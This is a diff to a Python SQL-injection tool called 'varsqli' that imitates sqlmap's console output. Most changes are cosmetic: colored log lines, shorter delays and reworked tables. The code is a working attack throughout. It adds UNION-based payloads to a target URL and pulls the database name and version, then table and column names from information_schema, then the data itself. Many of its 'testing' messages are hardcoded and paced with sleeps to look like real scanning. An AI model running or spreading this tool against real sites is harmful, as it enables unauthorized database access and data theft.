@@ -1,4 +1,3 @@
-# Updated 
 import requests
 import argparse
 import re
@@ -6,6 +5,7 @@ import datetime
 import socket
 import time
 import colorama
+import threading
 from colorama import Fore
 from colorama import Style
 from bs4 import BeautifulSoup
@@ -164,9 +164,9 @@ if args.url:
     print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " target URL content is stable")
     time.sleep(0.50)
     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing if GET parameter 'id' is dynamic")
-    time.sleep(3)
+    time.sleep(1)
     print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')")
-    time.sleep(2)
+    time.sleep(1)
     print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks")
     time.sleep(1)
     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing for SQL injection on GET parameter 'id'")
@@ -182,7 +182,7 @@ if args.url:
     print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'")
     time.sleep(1)
     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'")
-    time.sleep(2)
+    time.sleep(1)
     print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'")
     time.sleep(1.5)
     print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'")
@@ -199,47 +199,7 @@ if args.url:
     time.sleep(0.50)
     print(Fore.YELLOW + Style.BRIGHT + "[WARNING]" + Style.RESET_ALL + " URI parameter '#1*' does not appear to be dynamic")
     time.sleep(0.50)
-    print(Fore.YELLOW + Style.BRIGHT + "[WARNING]" + Style.RESET_ALL + " heuristic (basic) test shows that URI parameter '#1*' might not be injectable")
-    time.sleep(0.50)
-    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing for SQL injection on URI parameter '#1*'")
-    time.sleep(0.50)
-    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'AND boolean-based blind - WHERE or HAVING clause'")
-    time.sleep(0.50)
-    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'Boolean-based blind - Parameter replace (original value)'")
-    time.sleep(0.50)
-    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'")
-    time.sleep(0.50)
-    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'PostgreSQL AND error-based - WHERE or HAVING clause'")
-    time.sleep(0.50)
-    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'")
-    time.sleep(0.50)
-    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'")
-    time.sleep(0.50)
-    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'Generic inline queries'")
-    time.sleep(0.50)
-    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'PostgreSQL > 8.1 stacked queries (comment)'")
-    time.sleep(0.50)
-    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'Microsoft SQL Server/Sybase stacked queries (comment)'")
-    time.sleep(0.50)
-    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'")
-    time.sleep(0.50)
-    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'")
-    time.sleep(0.50)
-    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " testing 'PostgreSQL > 8.1 AND time-based blind'")
-    time.sleep(0.50)
-    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable")
-    time.sleep(1)
-    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'MySQL inline queries'")
-    time.sleep(1)
-    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " testing 'Generic UNION query (NULL) - 1 to 20 columns'")
-    time.sleep(4)
-    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found")
-    time.sleep(1)
-    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test")
-    time.sleep(1)
-    print(Fore.GREEN + "[INFO]" + Style.RESET_ALL + " target URL appears to have 11 columns in query")
-    time.sleep(1)
-    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable")
+    print(Fore.YELLOW + Style.BRIGHT + "[WARNING]" + Style.RESET_ALL + " Testing UNION SELECt COUNT NUMBERS NULL or 50 Select....")
     check_vuln = "%27"
     checks = requests.get(url + check_vuln)
     if "at line" in checks.text:
@@ -281,9 +241,10 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
       Payload: {payload} CONCAT(0x71787a7871,(SELECT (ELT(4239=4239,1))),0x7170706b71,FLOOR(RAND(0)*2))
 ---
 ''')         
+
                             
                             if args.dbs:
-                                print("[INFO] Starting fetching Database name..............")
+                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting fetching Database name..............")
                                 num = count_num
                                 nums = [num for num in range(2, num+1)]
                                 for numbers in nums:
@@ -291,7 +252,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                     split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                     check_count = requests.get(url + split_nums)
                                     if str(numbers) and "::" in check_count.text:
-                                        print("[INFO] FOund columns : {}".format(numbers))
+                                        print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Found columns : {}".format(numbers))
                                         payload_get_dbs = "(SELECT GROUP_CONCAT(database(),'::',version()))"
 
                                         split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_dbs, payload)
@@ -335,7 +296,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                         find_data = r"\b\w+::\b"
                                                         findall_all = re.findall(find_data, html_content)
                                                         for dump in findall_all:
-                                                            dump_dbs = dump.replace("::", "\n")
+                                                            dump_dbs = dump.replace("::", "")
                                                             print(f"+-------------------+")
                                                             print(f"| {table_names} - {columns_name}")
                                                             print(f"+-------------------+")
@@ -353,7 +314,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                 pass
                             if args.TAB:
                                 if args.DB:
-                                    print("[INFO] Starting Enumerate Tables name.......")
+                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                     num = count_num
                                     nums = [num for num in range(2, num+1)]
                                     for numbers in nums:
@@ -361,7 +322,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                         checking_count = requests.get(url + split_num)
                                         if str(numbers) and "::" in checking_count.text:
-                                            print("[INFO] Columns Found : {}".format(numbers))
+                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                             payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                             split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                             get_content = requests.get(url + split_num)
@@ -373,15 +334,15 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 tables_name = tables_dump.replace("::", "")
                                                 print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
                                                 time.sleep(0.30)
-                                            print('+----------------------------+')
+                                            print('+----------------------------------+')
+                                            print("|         Tables Name              |")
+                                            print("+----------------------------------+")
                                             num_tab = 0
                                             for dump in find_all:
                                                 num_tab += 1
                                                 tables_name = dump.replace("::", " ")
-                                                print("+-------------------------+")
                                                 print("|", tables_name)
-                                                time.sleep(0.30)
-                                            print("+----------------------------+")
+                                            print("+----------------------------------+")
                                             print("Find {} Tables".format(num_tab))
                                             print("")
                                             exit()
@@ -392,7 +353,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
 
                             if args.COL:
                                 if args.DB: 
-                                    print("[INFO] Starting Enumerate Tables name.......")
+                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                     num = count_num
                                     nums = [num for num in range(2, num+1)]
                                     for numbers in nums:
@@ -400,7 +361,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                         checking_count = requests.get(url + split_num)
                                         if str(numbers) and "::" in checking_count.text:
-                                            print("[INFO] Columns Found : {}".format(numbers))
+                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                             payload_get_table = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                             split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_table, payload)
                                             get_contents = requests.get(url + split_nums)
@@ -426,9 +387,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                             for dump in find_all:
                                                 num_tab += 1
                                                 tables_name = dump.replace("::", " ")
-                                                print("+--------------------------+")
                                                 print("|", tables_name)
-                                                time.sleep(0.30)
                                             print("+------------------------------+")
                                             print("Find {} Tables and Columns".format(num_tab))
                                             print("")
@@ -441,7 +400,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
 
                             if args.dumps:
                                 if args.DB:
-                                    print("[INFO] Starting Enumerate Tables name.......")
+                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                     num = count_num
                                     nums = [num for num in range(2, num+1)]
                                     for numbers in nums:
@@ -449,7 +408,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                         checking_count = requests.get(url + split_num)
                                         if str(numbers) and "::" in checking_count.text:
-                                            print("[INFO] Columns Found : {}".format(numbers))
+                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                             payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                             split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                             get_content = requests.get(url + split_num)
@@ -461,20 +420,20 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 tables_name = tables_dump.replace("::", "")
                                                 print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
                                                 time.sleep(0.30)
-                                            print('+----------------------------+')
+                                            print('+----------------------------------+')
+                                            print("|         Tables Name              |")
+                                            print("+----------------------------------+")
                                             num_tab = 0
                                             for dump in find_all:
                                                 num_tab += 1
                                                 tables_name = dump.replace("::", " ")
-                                                print("+-----------------------+")
                                                 print("|", tables_name)
-                                                time.sleep(0.30)
 
                                             print("+----------------------------+")
                                             print("Find {} Tables".format(num_tab))
                                             break
 
-                                    print("[INFO] Starting Enumerate Columns name.......")
+                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Columns name.......")
                                     num = count_num
                                     nums = [num for num in range(2, num+1)]
                                     for numbers in nums:
@@ -482,7 +441,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                         checking_count = requests.get(url + split_num)
                                         if str(numbers) and "::" in checking_count.text:
-                                            print("[INFO] Columns Found : {}".format(numbers))
+                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                             payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                             split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                             get_content = requests.get(url + split_num)
@@ -494,19 +453,19 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 tables_name = tables_dump.replace("::", "")
                                                 print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
                                                 time.sleep(0.30)
-                                            print('+----------------------------+')
+                                            print('+----------------------------------+')
+                                            print("|         Column Name              |")
+                                            print("+----------------------------------+")
                                             num_tab = 0
                                             for dump in find_all:
                                                 num_tab += 1
                                                 tables_name = dump.replace("::", " ")
-                                                print("+-----------------------+")
                                                 print("|", tables_name)
-                                                time.sleep(0.30)
                                             print("+----------------------------+")
                                             print("Find {} Tables".format(num_tab))
                                             break
 
-                                    print("[INFO] Starting Enumerate Columns and Tables name.......")
+                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Columns and Tables name.......")
                                     num = count_num
                                     nums = [num for num in range(2, num+1)]
                                     for numbers in nums:
@@ -540,9 +499,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 for dump in find_all:
                                                     num_tab += 1
                                                     tables_name = dump.replace("::", " ")
-                                                    print("+--------------------------+")
                                                     print("|", tables_name)
-                                                    time.sleep(0.30)
                                                 print("+------------------------------+")
                                                 print("Find {} Tables and Columns".format(num_tab))
                                                 print("")
@@ -585,9 +542,10 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
       Title: Generic UNION query (NULL) - {count_num} columns
       Payload: {payload} CONCAT(0x71787a7871,(SELECT (ELT(4239=4239,1))),0x7170706b71,FLOOR(RAND(0)*2)) 
   ---
-  ''')
+  ''')                      
+                            
                             if args.dbs:
-                                print("[INFO] Starting fetching Database name..............")
+                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting fetching Database name..............")
                                 num = count_num
                                 nums = [num for num in range(2, num+1)]
                                 for numbers in nums:
@@ -595,7 +553,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                     split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                     check_count = requests.get(url + split_nums)
                                     if str(numbers) and "::" in check_count.text:
-                                        print("[INFO] FOund columns : {}".format(numbers))
+                                        print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Found columns : {}".format(numbers))
                                         payload_get_dbs = "(SELECT GROUP_CONCAT(database(),'::',version()))"
 
                                         split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_dbs, payload)
@@ -604,13 +562,14 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                         # checking find
                                         check_find = r"\b\w+::\b"
                                         find_all = re.findall(check_find, html_content)
-                                        print("[INFO] back-end MySQL : MySQL >= x.x")
+                                        print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " back-end MySQL : MySQL >= x.x")
                                         print("available databases [2]:")
                                         for dbs in find_all:
                                             dbs_name = dbs.replace("::", " ")
                                             print("+-----------------------+")
                                             print("[*]", dbs_name)
                                             print("[*] information_schema")
+                                            print("")
                                             exit()
                                         print("")
                             else:
@@ -638,11 +597,11 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                         find_data = r"\b\w+::\b"
                                                         findall_all = re.findall(find_data, html_content)
                                                         for dump in findall_all:
-                                                            dump_dbs = dump.replace("::", "  ")
+                                                            dump_dbs = dump.replace("::", "")
                                                             print(f"+-------------------+")
                                                             print(f"| {table_names} - {columns_name}")
                                                             print(f"+-------------------+")
-                                                            print(f"| {columns_name} : {dump_dbs} ")
+                                                            print(f"| {columns_name} : {dump_dbs}")
                                                             print(f"+-------------------+")
                                                             exit()
                                                     dump()
@@ -656,7 +615,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                 pass
                             if args.TAB:
                                 if args.DB:
-                                    print("[INFO] Starting Enumerate Tables name.......")
+                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                     num = count_num
                                     nums = [num for num in range(2, num+1)]
                                     for numbers in nums:
@@ -664,7 +623,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                         checking_count = requests.get(url + split_num)
                                         if str(numbers) and "::" in checking_count.text:
-                                            print("[INFO] Columns Found : {}".format(numbers))
+                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                             payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                             split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                             get_content = requests.get(url + split_num)
@@ -676,14 +635,15 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 tables_name = tables_dump.replace("::", "")
                                                 print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
                                                 time.sleep(0.30)
-                                            print('+----------------------------+')
+                                            print('+----------------------------------+')
+                                            print("|         Tables Name              |")
+                                            print("+----------------------------------+")
                                             num_tab = 0
                                             for dump in find_all:
                                                 num_tab += 1
                                                 tables_name = dump.replace("::", " ")
                                                 print("|", tables_name)
-                                                time.sleep(0.30)
-                                            print("+----------------------------+")
+                                            print("+----------------------------------+")
                                             print("Find {} Tables".format(num_tab))
                                             print("")
                                             exit()
@@ -694,7 +654,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
 
                             if args.COL:
                                 if args.DB: 
-                                    print("[INFO] Starting Enumerate Tables name.......")
+                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                     num = count_num
                                     nums = [num for num in range(2, num+1)]
                                     for numbers in nums:
@@ -702,35 +662,35 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                         checking_count = requests.get(url + split_num)
                                         if str(numbers) and "::" in checking_count.text:
-                                            print("[INFO] Columns Found : {}".format(numbers))
-                                            print("[INFO] Columns Found : {}".format(numbers))
-                                            payload_get_table = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
+                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
+                                            payload_get_table = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                             split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_table, payload)
                                             get_contents = requests.get(url + split_nums)
                                             html_contents = get_contents.text
-                                            find_checkings = r"\b\w+::\b"
+                                            find_checkings = r"\b\w+::\b\w+::\b"
                                             find_alls = re.findall(find_checkings, html_contents)
 
-                                            payload_get_tables = f"(SELECT GROUP_CONCAT(column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.columns WHERE table_schema='{args.DB}')"
+                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.columns WHERE table_schema='{args.DB}')"
                                             split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                             get_content = requests.get(url + split_num)
                                             html_content = get_content.text
-                                            find_checking = r"\b\w+::\b"
+                                            find_checking = r"\b\w+::\b\w+::\b"
                                             find_all = re.findall(find_checking, html_content)
                                             print(split_num)
                                             for column_dump in find_all:
-                                                columns_name = column_dump.replace("::", "")
+                                                columns_name = column_dump.replace("::", " ")
                                                 print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching database tables on columns name : {}".format(columns_name))
                                                 time.sleep(0.30)
-                                            print('+----------------------------+')
+                                            print("+------------------------------+")
+                                            print("| Tables Name  |  Columns Name |")
+                                            print("+------------------------------+")
                                             num_tab = 0
                                             for dump in find_all:
                                                 num_tab += 1
                                                 tables_name = dump.replace("::", " ")
                                                 print("|", tables_name)
-                                                time.sleep(0.30)
-                                            print("+----------------------------+")
-                                            print("Find {} Columns".format(num_tab))
+                                            print("+------------------------------+")
+                                            print("Find {} Tables and Columns".format(num_tab))
                                             print("")
                                             exit()
                                 else:
@@ -738,9 +698,10 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                             else:
                                 pass
 
+
                             if args.dumps:
                                 if args.DB:
-                                    print("[INFO] Starting Enumerate Tables name.......")
+                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                     num = count_num
                                     nums = [num for num in range(2, num+1)]
                                     for numbers in nums:
@@ -748,7 +709,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                         checking_count = requests.get(url + split_num)
                                         if str(numbers) and "::" in checking_count.text:
-                                            print("[INFO] Columns Found : {}".format(numbers))
+                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                             payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                             split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                             get_content = requests.get(url + split_num)
@@ -760,20 +721,20 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 tables_name = tables_dump.replace("::", "")
                                                 print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
                                                 time.sleep(0.30)
-                                            print('+----------------------------+')
+                                            print('+----------------------------------+')
+                                            print("|         Tables Name              |")
+                                            print("+----------------------------------+")
                                             num_tab = 0
                                             for dump in find_all:
                                                 num_tab += 1
                                                 tables_name = dump.replace("::", " ")
-                                                print("+-----------------------+")
                                                 print("|", tables_name)
-                                                time.sleep(0.30)
 
                                             print("+----------------------------+")
                                             print("Find {} Tables".format(num_tab))
                                             break
 
-                                    print("[INFO] Starting Enumerate Columns name.......")
+                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Columns name.......")
                                     num = count_num
                                     nums = [num for num in range(2, num+1)]
                                     for numbers in nums:
@@ -781,7 +742,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                         split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                         checking_count = requests.get(url + split_num)
                                         if str(numbers) and "::" in checking_count.text:
-                                            print("[INFO] Columns Found : {}".format(numbers))
+                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                             payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                             split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                             get_content = requests.get(url + split_num)
@@ -793,19 +754,19 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 tables_name = tables_dump.replace("::", "")
                                                 print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
                                                 time.sleep(0.30)
-                                            print('+----------------------------+')
+                                            print('+----------------------------------+')
+                                            print("|         Column Name              |")
+                                            print("+----------------------------------+")
                                             num_tab = 0
                                             for dump in find_all:
                                                 num_tab += 1
                                                 tables_name = dump.replace("::", " ")
-                                                print("+-----------------------+")
                                                 print("|", tables_name)
-                                                time.sleep(0.30)
                                             print("+----------------------------+")
                                             print("Find {} Tables".format(num_tab))
                                             break
 
-                                    print("[INFO] Starting Enumerate Columns and Tables name.......")
+                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Columns and Tables name.......")
                                     num = count_num
                                     nums = [num for num in range(2, num+1)]
                                     for numbers in nums:
@@ -839,14 +800,11 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                 for dump in find_all:
                                                     num_tab += 1
                                                     tables_name = dump.replace("::", " ")
-                                                    print("+--------------------------+")
                                                     print("|", tables_name)
-                                                    time.sleep(0.30)
                                                 print("+------------------------------+")
                                                 print("Find {} Tables and Columns".format(num_tab))
                                                 print("")
                                                 exit()
-
             start_exploit_1()
     # check vuln
     else:
